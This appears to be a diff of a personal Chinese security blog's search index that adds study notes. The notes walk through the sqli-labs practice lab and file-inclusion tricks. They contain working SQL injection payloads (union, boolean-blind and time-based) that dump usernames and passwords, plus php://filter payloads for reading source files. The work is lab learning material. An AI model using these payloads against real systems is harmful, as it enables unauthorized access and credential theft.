+<p><img src="/2023/07/22/Log4j2/image-20230718101744476-16900229430719.png" alt="image-20230718101744476"></p>
+]]></content>
+  </entry>
+  <entry>
     <title>JS原型链污染</title>
     <url>/2023/07/17/JS%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93-0/</url>
     <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>JS原型链的学习以及污染</p>
@@ -1218,7 +1381,7 @@ d = R(2\frac{\rho _M}{\rho_m})^\frac{1}{3}</script><p><img src="/2023/02/21/%E7%
 ]]></content>
   </entry>
   <entry>
-    <title>file_include</title>
+    <title>文件包含</title>
     <url>/2023/07/04/file-include/</url>
     <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>文件包含漏洞中伪协议的利用和绕过方法</p>
 <span id="more"></span>
@@ -1231,7 +1394,7 @@ d = R(2\frac{\rho _M}{\rho_m})^\frac{1}{3}</script><p><img src="/2023/02/21/%E7%
 <p>/convert.base64-encode：转换器编码</p>
 <p>/resource=[filename]：目标文件过滤的流</p>
 <p>使用方式：</p>
-<figure class="highlight livecodeserver"><table><tr><td class="code"><pre><span class="line">？<span class="built_in">file</span>=php：<span class="built_in">filter</span>/<span class="built_in">read</span>=<span class="built_in">convert</span>.base64-encode/resource=index.php</span><br><span class="line">通过指定末尾的文件，可以读取经base64加密后的文件源码，之后再base64解码一下就行，虽然不能直接获取到<span class="built_in">shell</span>等，但能读取敏感文件危害也是挺大的，同时也能够对网站源码进行审计。</span><br><span class="line">？<span class="built_in">file</span>=php://<span class="built_in">filter</span>/<span class="built_in">convert</span>.base64-encode/resource=index.php</span><br><span class="line">效果跟前面一样，只是少了个<span class="built_in">read</span>关键字，在绕过一些waf时也许有用。</span><br></pre></td></tr></table></figure>
+<figure class="highlight livecodeserver"><table><tr><td class="code"><pre><span class="line">?<span class="built_in">file</span>=php://<span class="built_in">filter</span>/<span class="built_in">read</span>=<span class="built_in">convert</span>.base64-encode/resource=index.php</span><br><span class="line">通过指定末尾的文件，可以读取经base64加密后的文件源码，之后再base64解码一下就行，虽然不能直接获取到<span class="built_in">shell</span>等，但能读取敏感文件危害也是挺大的，同时也能够对网站源码进行审计。</span><br><span class="line">?<span class="built_in">file</span>=php://<span class="built_in">filter</span>/<span class="built_in">convert</span>.base64-encode/resource=index.php</span><br><span class="line">效果跟前面一样，只是少了个<span class="built_in">read</span>关键字，在绕过一些waf时也许有用。</span><br></pre></td></tr></table></figure>
 <h3 id="file-协议"><a href="#file-协议" class="headerlink" title="file://协议"></a>file://协议</h3><p>?file=file://[文件绝对路径+文件名]</p>
 <p>专门用于访问本地文件系统，可以对本地文件进行读取</p>
 <h3 id="php-input"><a href="#php-input" class="headerlink" title="php://input"></a>php://input</h3><p>注意：entype=”multipart/form-data”时，该协议是无效的</p>
@@ -1915,6 +2078,111 @@ d = R(2\frac{\rho _M}{\rho_m})^\frac{1}{3}</script><p><img src="/2023/02/21/%E7%
 <p><b>file表示协议类型：</b><br>://后面是机器的网络地址（IP地址）<br>/后面是文件夹（目录）和文件名<br>整体形如：<br>file://机器的IP地址/目录/文件<br>对于本地机器，机器的IP地址变成127.0.0.1或localhost或干脆什么也不写。<br>对于本地机器，根目录下的目录是Windows下的盘符，如“C:”、“D:”等。<br>file://127.0.0.1/C:/    本地C盘<br>file://localhost/D:/    本地D盘<br>file:///E:/            本地E盘<br>需要注意的是，最后面的/是必不可少的，且file协议，通常只能在Windows Explorer和Micosoft IE中使用！</p>
 <h2 id="Impossible"><a href="#Impossible" class="headerlink" title="Impossible"></a>Impossible</h2><p><img src="/2023/06/24/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20230625000921157.png" alt="image-20230625000921157"></p>
 <p>直接使用了白名单来防止预期外的输入</p>
+]]></content>
+  </entry>
+  <entry>
+    <title>sqls-lab</title>
+    <url>/2023/06/24/sqls-lab/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="GET"><a href="#GET" class="headerlink" title="GET"></a>GET</h1><h2 id="Error-Based"><a href="#Error-Based" class="headerlink" title="Error Based"></a>Error Based</h2><h3 id="single-quotes"><a href="#single-quotes" class="headerlink" title="single quotes"></a>single quotes</h3><p><img src="/2023/06/24/sqls-lab/image-20230624132457178.png" alt="image-20230624132457178"><br>提示请输入ID作为带有数值的参数</p>
+<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">GET</span> /sqli-labs/Less-<span class="number">1</span>/?id=<span class="number">1</span> HTTP/<span class="number">1</span>.<span class="number">1</span></span><br><span class="line"><span class="attribute">Host</span>: <span class="number">192.168.153.139</span></span><br><span class="line"><span class="attribute">User</span>-Agent: Mozilla/<span class="number">5</span>.<span class="number">0</span> (Windows NT <span class="number">10</span>.<span class="number">0</span>; Win64; x64; rv:<span class="number">109</span>.<span class="number">0</span>) Gecko/<span class="number">20100101</span> Firefox/<span class="number">114</span>.<span class="number">0</span></span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=<span class="number">0</span>.<span class="number">9</span>,image/avif,image/webp,*/*;q=<span class="number">0</span>.<span class="number">8</span></span><br><span class="line"><span class="attribute">Accept</span>-Language: zh-CN,zh;q=<span class="number">0</span>.<span class="number">8</span>,zh-TW;q=<span class="number">0</span>.<span class="number">7</span>,zh-HK;q=<span class="number">0</span>.<span class="number">5</span>,en-US;q=<span class="number">0</span>.<span class="number">3</span>,en;q=<span class="number">0</span>.<span class="number">2</span></span><br><span class="line"><span class="attribute">Accept</span>-Encoding: gzip, deflate</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Cookie</span>: security=impossible; PHPSESSID=nmfrtk296tg3kl2oj2urk45b51</span><br><span class="line"><span class="attribute">Upgrade</span>-Insecure-Requests: <span class="number">1</span></span><br></pre></td></tr></table></figure>
+<p><img src="/2023/06/24/sqls-lab/image-20230624132740694.png" alt="image-20230624132740694"></p>
+<p>进行sql注入漏洞测试<img src="/2023/06/24/sqls-lab/image-20230624132828721.png" alt="image-20230624132828721"></p>
+<p><img src="/2023/06/24/sqls-lab/image-20230624132916156.png" alt="image-20230624132916156"></p>
+<p><img src="/2023/06/24/sqls-lab/image-20230624133004595.png" alt="image-20230624133004595"></p>
+<p><img src="/2023/06/24/sqls-lab/image-20230624133217657.png" alt="image-20230624133217657"></p>
+<p>判断存在sql注入，判断表中字段数</p>
+<p><img src="/2023/06/24/sqls-lab/image-20230624134701985.png" alt="image-20230624134701985"></p>
+<p><img src="/2023/06/24/sqls-lab/image-20230624134730086.png" alt="image-20230624134730086"></p>
+<p>得到字段数为3</p>
+<p><img src="/2023/06/24/sqls-lab/image-20230624135049821.png" alt="image-20230624135049821"></p>
+<p>获取数据库名和版本号</p>
+<p><img src="/2023/06/24/sqls-lab/image-20230624135237836.png" alt="image-20230624135237836"></p>
+<p>爆当前数据库下的表名</p>
+<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">?<span class="attribute">id</span>=-1&#x27;union select 1,2,group_concat(table_name) <span class="keyword">from</span> information_schema.tables where <span class="attribute">table_schema</span>=<span class="string">&#x27;security&#x27;</span>--+</span><br></pre></td></tr></table></figure>
+<p>group_concat()表示将输出结果连接起来</p>
+<p><img src="/2023/06/24/sqls-lab/image-20230624140111489.png" alt="image-20230624140111489"></p>
+<p>爆字段名</p>
+<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">?<span class="attribute">id</span>=-1&#x27;union select 1,2,group_concat(column_name) <span class="keyword">from</span> information_schema.columns where <span class="attribute">table_name</span>=<span class="string">&#x27;users&#x27;</span>--+</span><br></pre></td></tr></table></figure>
+<p><img src="/2023/06/24/sqls-lab/image-20230624141306000.png" alt="image-20230624141306000"></p>
+<p>爆信息</p>
+<p><img src="/2023/06/24/sqls-lab/image-20230624142041509.png" alt="image-20230624142041509"><br>看到敏感信息password</p>
+<p><img src="/2023/06/24/sqls-lab/image-20230624142333646.png" alt="image-20230624142333646"></p>
+<h3 id="intiger-based"><a href="#intiger-based" class="headerlink" title="intiger based"></a>intiger based</h3><p>判断注入类型<img src="/2023/06/24/sqls-lab/image-20230624142750640.png" alt="image-20230624142750640"></p>
+<p><img src="/2023/06/24/sqls-lab/image-20230624142950109.png" alt="image-20230624142950109"></p>
+<p>猜测为数字型注入，后面步骤类似</p>
+<p><img src="/2023/06/24/sqls-lab/image-20230624143119560.png" alt="image-20230624143119560"></p>
+<p><img src="/2023/06/24/sqls-lab/image-20230624143141427.png" alt="image-20230624143141427"></p>
+<p><img src="/2023/06/24/sqls-lab/image-20230624143245907.png" alt="image-20230624143245907"></p>
+<p><img src="/2023/06/24/sqls-lab/image-20230624143748871.png" alt="image-20230624143748871"></p>
+<p><img src="/2023/06/24/sqls-lab/image-20230624144031429.png" alt="image-20230624144031429"></p>
+<p><img src="/2023/06/24/sqls-lab/image-20230624144112982.png" alt="image-20230624144112982"></p>
+<h3 id="single-quotes-with-twist"><a href="#single-quotes-with-twist" class="headerlink" title="single quotes with twist"></a>single quotes with twist</h3><p>判断类型</p>
+<p><img src="/2023/06/24/sqls-lab/image-20230624144456020.png" alt="image-20230624144456020"></p>
+<p><img src="/2023/06/24/sqls-lab/image-20230624144521636.png" alt="image-20230624144521636"></p>
+<p><img src="/2023/06/24/sqls-lab/image-20230624144619505.png" alt="image-20230624144619505"></p>
+<p>通过报错信息可以推断代码形式为：’id=（‘&amp;id’ limit 0,1’，即带括号的字符型注入</p>
+<p>注入步骤</p>
+<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">?<span class="attribute">id</span>=2&#x27;)--+</span><br><span class="line">?<span class="attribute">id</span>=1&#x27;) order by 3--+</span><br><span class="line">?<span class="attribute">id</span>=-1&#x27;) union select 1,2,3--+</span><br><span class="line">?<span class="attribute">id</span>=-1&#x27;) union select 1,database(),version()--+</span><br><span class="line">?<span class="attribute">id</span>=-1&#x27;) union select 1,2,group_concat(table_name) <span class="keyword">from</span> information_schema.tables where <span class="attribute">table_schema</span>=<span class="string">&#x27;security&#x27;</span>--+</span><br><span class="line">?<span class="attribute">id</span>=-1&#x27;) union select 1,2,group_concat(column_name) <span class="keyword">from</span> information_schema.columns where <span class="attribute">table_name</span>=<span class="string">&#x27;users&#x27;</span>--+</span><br><span class="line">?<span class="attribute">id</span>=-1&#x27;) union select 1,2,group_concat(username ,id , password) <span class="keyword">from</span> users--+</span><br></pre></td></tr></table></figure>
+<h3 id="double-quotes"><a href="#double-quotes" class="headerlink" title="double quotes"></a>double quotes</h3><p><img src="/2023/06/24/sqls-lab/image-20230624145958846.png" alt="image-20230624145958846"></p>
+<p><img src="/2023/06/24/sqls-lab/image-20230624150016450.png" alt="image-20230624150016450"></p>
+<p><img src="/2023/06/24/sqls-lab/image-20230624151012695.png" alt="image-20230624151012695"></p>
+<p><img src="/2023/06/24/sqls-lab/image-20230624151143174.png" alt="image-20230624151143174"></p>
+<p>通过报错信息可以看到还要一个括号</p>
+<p><img src="/2023/06/24/sqls-lab/image-20230624151211951.png" alt="image-20230624151211951"></p>
+<p><img src="/2023/06/24/sqls-lab/image-20230624151224173.png" alt="image-20230624151224173"></p>
+<p>通过上面回显判断出为字符型双引号带括号注入</p>
+<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">?<span class="attribute">id</span>=1&quot;) order by 3--+</span><br><span class="line">?<span class="attribute">id</span>=-1&quot;) union select 1,2,3--+</span><br><span class="line">?<span class="attribute">id</span>=-1&quot;) union select 1,database(),version()--+</span><br><span class="line">?<span class="attribute">id</span>=-1&quot;) union select 1,2,group_concat(table_name) <span class="keyword">from</span> information_schema.tables where <span class="attribute">table_schema</span>=<span class="string">&#x27;security&#x27;</span>--+</span><br><span class="line">?<span class="attribute">id</span>=-1&quot;) union select 1,2,group_concat(column_name) <span class="keyword">from</span> information_schema.columns where <span class="attribute">table_name</span>=<span class="string">&#x27;users&#x27;</span>--+</span><br><span class="line">?<span class="attribute">id</span>=-1&quot;) union select 1,2,group_concat(username ,id , password) <span class="keyword">from</span> users--+</span><br></pre></td></tr></table></figure>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>遇到有回显的情况，判断是否存在注入点判断流程</p>
+<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">?<span class="attribute">id</span>=1</span><br><span class="line">?<span class="attribute">id</span>=1&#x27;</span><br><span class="line">?<span class="attribute">id</span>=1&#x27;--+</span><br><span class="line">?<span class="attribute">id</span>=1&#x27;)</span><br><span class="line">?<span class="attribute">id</span>=1&#x27;&#x27;</span><br><span class="line">?<span class="attribute">id</span>=1&quot;</span><br><span class="line">?<span class="attribute">id</span>=1&quot;--+</span><br><span class="line">?<span class="attribute">id</span>=1&quot;)</span><br><span class="line"><span class="built_in">..</span>.</span><br></pre></td></tr></table></figure>
+<h2 id="Double-Injection"><a href="#Double-Injection" class="headerlink" title="Double Injection"></a>Double Injection</h2><h3 id="single-quotes-1"><a href="#single-quotes-1" class="headerlink" title="single quotes"></a>single quotes</h3><p><img src="/2023/06/24/sqls-lab/image-20230624151643491.png" alt="image-20230624151643491"></p>
+<p><img src="/2023/06/24/sqls-lab/image-20230624151702537.png" alt="image-20230624151702537"></p>
+<p>判断为字符型注入，与上面不同的是不存在回显，所以不能使用联合查询，可以选择布尔盲注，  主要用到length(),ascii() ,substr()这三个函数</p>
+<p>获取数据库名长：使用length((select database()))</p>
+<p><img src="/2023/06/24/sqls-lab/image-20230624152431192.png" alt="image-20230624152431192"></p>
+<p><img src="/2023/06/24/sqls-lab/image-20230624152502119.png" alt="image-20230624152502119"></p>
+<p>可以使用二分法等方法得到最终结果</p>
+<p><img src="/2023/06/24/sqls-lab/image-20230624152709256.png" alt="image-20230624152709256"></p>
+<p>获取数据库名：ascii(substr((select database()),x,1))</p>
+<p><img src="/2023/06/24/sqls-lab/image-20230624153016951.png" alt="image-20230624153016951"></p>
+<p>ascii码115对应s，更改x的值得到数据库名威威security</p>
+<p>注入流程</p>
+<figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line">?id=<span class="number">1</span><span class="string">&#x27;and length((select database()))&gt;9--+</span></span><br><span class="line"><span class="string">?id=1&#x27;</span><span class="keyword">and</span> ascii(substr((<span class="keyword">select</span> <span class="keyword">database</span>()),<span class="number">1</span>,<span class="number">1</span>))=<span class="number">115</span><span class="comment">--+</span></span><br><span class="line">?id=<span class="number">1</span><span class="string">&#x27;and length((select group_concat(table_name) from information_schema.tables where table_schema=database()))&gt;13--+</span></span><br><span class="line"><span class="string">?id=1&#x27;</span><span class="keyword">and</span> ascii(substr((<span class="keyword">select</span> group_concat(<span class="built_in">table_name</span>) <span class="keyword">from</span> information_schema.<span class="keyword">tables</span> <span class="keyword">where</span> table_schema=<span class="keyword">database</span>()),<span class="number">1</span>,<span class="number">1</span>))&gt;<span class="number">99</span><span class="comment">--+</span></span><br><span class="line">?id=<span class="number">1</span><span class="string">&#x27;and length((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;</span>users<span class="string">&#x27;))&gt;20--+</span></span><br><span class="line"><span class="string">?id=1&#x27;</span><span class="keyword">and</span> ascii(substr((<span class="keyword">select</span> group_concat(<span class="built_in">column_name</span>) <span class="keyword">from</span> information_schema.<span class="keyword">columns</span> <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() <span class="keyword">and</span> <span class="built_in">table_name</span>=<span class="string">&#x27;users&#x27;</span>),<span class="number">1</span>,<span class="number">1</span>))&gt;<span class="number">99</span><span class="comment">--+</span></span><br><span class="line">?id=<span class="number">1</span><span class="string">&#x27; and length((select group_concat(username,password) from users))&gt;109--+</span></span><br><span class="line"><span class="string">?id=1&#x27;</span> <span class="keyword">and</span> ascii(substr((<span class="keyword">select</span> group_concat(username,<span class="keyword">password</span>) <span class="keyword">from</span> users),<span class="number">1</span>,<span class="number">1</span>))&gt;<span class="number">50</span><span class="comment">--+</span></span><br><span class="line"> </span><br></pre></td></tr></table></figure>
+<h2 id="Dump-into-Outfile"><a href="#Dump-into-Outfile" class="headerlink" title="Dump into Outfile"></a>Dump into Outfile</h2><p><img src="/2023/06/24/sqls-lab/image-20230624155134499.png" alt="image-20230624155134499"></p>
+<p><img src="/2023/06/24/sqls-lab/image-20230624155149123.png" alt="image-20230624155149123"></p>
+<p><img src="/2023/06/24/sqls-lab/image-20230624155215826.png" alt="image-20230624155215826"></p>
+<p>不是单引号</p>
+<p><img src="/2023/06/24/sqls-lab/image-20230624155249517.png" alt="image-20230624155249517"></p>
+<p><img src="/2023/06/24/sqls-lab/image-20230624155305884.png" alt="image-20230624155305884"></p>
+<p>不是引号加括号</p>
+<p><img src="/2023/06/24/sqls-lab/image-20230624155327781.png" alt="image-20230624155327781"></p>
+<p><img src="/2023/06/24/sqls-lab/image-20230624155420801.png" alt="image-20230624155420801"></p>
+<p><img src="/2023/06/24/sqls-lab/image-20230624155433640.png" alt="image-20230624155433640"></p>
+<p><img src="/2023/06/24/sqls-lab/image-20230624155448974.png" alt="image-20230624155448974"></p>
+<p><img src="/2023/06/24/sqls-lab/image-20230624155625810.png" alt="image-20230624155625810"></p>
+<p><img src="/2023/06/24/sqls-lab/image-20230624155636708.png" alt="image-20230624155636708"></p>
+<p>得到注入模板为：?id=1’)) <sql> —+</sql></p>
+<h2 id="Blind"><a href="#Blind" class="headerlink" title="Blind"></a>Blind</h2><p><img src="/2023/06/24/sqls-lab/image-20230624155801434.png" alt="image-20230624155801434"></p>
+<p><img src="/2023/06/24/sqls-lab/image-20230624155815722.png" alt="image-20230624155815722"></p>
+<p>没有报错回显</p>
+<p><img src="/2023/06/24/sqls-lab/image-20230624155832996.png" alt="image-20230624155832996"></p>
+<p>得到单引号</p>
+<p><img src="/2023/06/24/sqls-lab/image-20230624155849312.png" alt="image-20230624155849312"></p>
+<p>得到结果</p>
+<h2 id="Time-based"><a href="#Time-based" class="headerlink" title="Time based"></a>Time based</h2><p><img src="/2023/06/24/sqls-lab/image-20230624160122476.png" alt="image-20230624160122476"></p>
+<p><img src="/2023/06/24/sqls-lab/image-20230624160134009.png" alt="image-20230624160134009"></p>
+<p><img src="/2023/06/24/sqls-lab/image-20230624160142992.png" alt="image-20230624160142992"></p>
+<p>发现页面不发生变化，布尔盲注依赖于页面不同反应，这里应该使用时间盲注，时间注入和布尔盲注两种没有多大差别只不过时间盲注多了if函数和sleep()函数</p>
+<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">?<span class="attribute">id</span>=1&#x27; <span class="keyword">and</span> <span class="keyword">if</span>(<span class="attribute">1</span>=1,sleep(5),1)--+</span><br><span class="line">判断参数构造。</span><br><span class="line">?<span class="attribute">id</span>=1&#x27;and <span class="keyword">if</span>(length((select database()))&gt;9,sleep(5),1)--+</span><br><span class="line">判断数据库名长度</span><br><span class="line"> </span><br><span class="line">?<span class="attribute">id</span>=1&#x27;and <span class="keyword">if</span>(ascii(substr((select database()),1,1))=115,sleep(5),1)--+</span><br><span class="line">逐一判断数据库字符</span><br><span class="line">?<span class="attribute">id</span>=1&#x27;and <span class="keyword">if</span>(length((select group_concat(table_name) <span class="keyword">from</span> information_schema.tables where <span class="attribute">table_schema</span>=database()))&gt;13,sleep(5),1)--+</span><br><span class="line">判断所有表名长度</span><br><span class="line"> </span><br><span class="line">?<span class="attribute">id</span>=1&#x27;and <span class="keyword">if</span>(ascii(substr((select group_concat(table_name) <span class="keyword">from</span> information_schema.tables where <span class="attribute">table_schema</span>=database()),1,1))&gt;99,sleep(5),1)--+</span><br><span class="line">逐一判断表名</span><br><span class="line">?<span class="attribute">id</span>=1&#x27;and <span class="keyword">if</span>(length((select group_concat(column_name) <span class="keyword">from</span> information_schema.columns where <span class="attribute">table_schema</span>=database() <span class="keyword">and</span> <span class="attribute">table_name</span>=<span class="string">&#x27;users&#x27;</span>))&gt;20,sleep(5),1)--+</span><br><span class="line">判断所有字段名的长度</span><br><span class="line"> </span><br><span class="line">?<span class="attribute">id</span>=1&#x27;and <span class="keyword">if</span>(ascii(substr((select group_concat(column_name) <span class="keyword">from</span> information_schema.columns where <span class="attribute">table_schema</span>=database() <span class="keyword">and</span> <span class="attribute">table_name</span>=<span class="string">&#x27;users&#x27;</span>),1,1))&gt;99,sleep(5),1)--+</span><br><span class="line">逐一判断字段名。</span><br><span class="line">?<span class="attribute">id</span>=1&#x27; <span class="keyword">and</span> <span class="keyword">if</span>(length((select group_concat(username,password) <span class="keyword">from</span> users))&gt;109,sleep(5),1)--+</span><br><span class="line">判断字段内容长度</span><br><span class="line"></span><br><span class="line">?<span class="attribute">id</span>=1&#x27; <span class="keyword">and</span> <span class="keyword">if</span>(ascii(substr((select group_concat(username,password) <span class="keyword">from</span> users),1,1))&gt;50,sleep(5),1)--+</span><br><span class="line">逐一检测内容。</span><br></pre></td></tr></table></figure>
+<h1 id="POST"><a href="#POST" class="headerlink" title="POST"></a>POST</h1><h2 id="Error-Based-1"><a href="#Error-Based-1" class="headerlink" title="Error Based"></a>Error Based</h2><p><img src="/2023/06/24/sqls-lab/image-20230624161449627.png" alt="image-20230624161449627"></p>
+<p>输入1’报错<br><img src="/2023/06/24/sqls-lab/image-20230624161524526.png" alt="image-20230624161524526"></p>
+<p>所以输入恒成立语句就可以了，比如1’ or 1=1#</p>
+<p><img src="/2023/06/24/sqls-lab/image-20230624161710978.png" alt="image-20230624161710978"></p>
+<p>爆破列数：1’ order by x#</p>
+<p><img src="/2023/06/24/sqls-lab/image-20230624161929155.png" alt="image-20230624161929155"></p>
+<p>order by 2无报错<br>因为有回显使用联合查询，后面步骤一样</p>
+<p><img src="/2023/06/24/sqls-lab/image-20230624162324042.png" alt="image-20230624162324042"></p>
+<h2 id="Double-Injection-1"><a href="#Double-Injection-1" class="headerlink" title="Double Injection"></a>Double Injection</h2><p><img src="/2023/06/24/sqls-lab/image-20230624162621603.png" alt="image-20230624162621603"></p>
+<p>成功登录但是无回显，无法使用联合查询，但是正确错误页面不同，所以使用布尔盲注</p>
 ]]></content>
   </entry>
   <entry>
@@ -6218,7 +6486,7 @@ S ='a_1a_2....a_n'</script><p>S：串名       n：串的长度   n=0时成为�
 <span id="more"></span>
 <h2 id="get使用方法"><a href="#get使用方法" class="headerlink" title="get使用方法"></a>get使用方法</h2><p>(1)查看是否有注入点：sqlmap -u 网址<br><img src="/2022/08/15/sqlmap%E4%BD%BF%E7%94%A8/image-20220815143754072.png" alt><br><img src="/2022/08/15/sqlmap%E4%BD%BF%E7%94%A8/image-20220815143808583.png" alt><br>证明有注入点</p>
 <p><img src="/2022/08/15/sqlmap%E4%BD%BF%E7%94%A8/image-20230625115053214.png" alt="image-20230625115053214"></p>
-<p>出现了302重定向会返回登录界面，证明这个需要cookie，提供抓包获得的cookie</p>
+<p>出现了302重定向会返回登录界面，证明这个需要cookie，提供抓包获得的cookie<br>参数：—cookie</p>
 <p><img src="/2022/08/15/sqlmap%E4%BD%BF%E7%94%A8/image-20220815143944207.png" alt><br>得到服务器操作系统为linux centOS，后端语言为php，数据库为mysql</p>
 <p>(2)获取数据库<br>        ((1))获取全部数据库<br><img src="/2022/08/15/sqlmap%E4%BD%BF%E7%94%A8/image-20220815144244725.png" alt><br><img src="/2022/08/15/sqlmap%E4%BD%BF%E7%94%A8/image-20220815144303120.png" alt><br>        ((2))获取当前数据库<br><img src="/2022/08/15/sqlmap%E4%BD%BF%E7%94%A8/image-20220815144412391.png" alt><br><img src="/2022/08/15/sqlmap%E4%BD%BF%E7%94%A8/image-20220815144432759.png" alt="image-20220815144432759"></p>
 <p>(3)获取当前数据库里所有表<br><img src="/2022/08/15/sqlmap%E4%BD%BF%E7%94%A8/image-20220815144547931.png" alt><br><img src="/2022/08/15/sqlmap%E4%BD%BF%E7%94%A8/image-20220815144611455.png" alt="image-20220815144611455"></p>
